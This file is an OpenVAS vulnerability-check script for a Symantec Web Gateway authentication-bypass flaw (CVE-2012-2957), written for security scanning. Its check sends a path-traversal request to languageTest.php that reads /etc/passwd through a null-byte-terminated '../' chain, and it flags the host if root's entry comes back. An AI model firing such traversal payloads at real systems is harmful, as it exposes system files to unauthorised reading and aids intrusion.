###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_symantec_web_gateway_54429.nasl 10941 2018-08-13 14:33:26Z asteins $
#
# Symantec Web Gateway  Local File Manipulation Authentication Bypass Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:symantec:web_gateway";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103523");
  script_bugtraq_id(54429);
  script_cve_id("CVE-2012-2957");
  script_tag(name:"cvss_base", value:"7.2");
  script_tag(name:"cvss_base_vector", value:"AV:L/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 10941 $");

  script_name("Symantec Web Gateway Local File Manipulation Authentication Bypass Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54429");
  script_xref(name:"URL", value:"http://www.symantec.com/business/web-gateway");

  script_tag(name:"last_modification", value:"$Date: 2018-08-13 16:33:26 +0200 (Mon, 13 Aug 2018) $");
  script_tag(name:"creation_date", value:"2012-07-24 10:16:58 +0200 (Tue, 24 Jul 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"VendorFix");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_symantec_web_gateway_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("symantec_web_gateway/installed");
  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for more
information.");
  script_tag(name:"summary", value:"Symantec Web Gateway is prone to a local authentication-bypass
vulnerability

A attacker can exploit this issue by manipulating certain local files to bypass
authentication and gain unauthorized privileged access to the application. Successful
exploits may lead to  other attacks.

Symantec Web Gateway versions 5.0.x.x are vulnerable.");
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

url = dir + '/spywall/languageTest.php?&language=' + crap(data:"../",length:6*9) + 'etc/passwd%00';

req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("root:x:0:0:root:" >< buf) {

   security_message(port:port);
   exit(0);

}

exit(0);
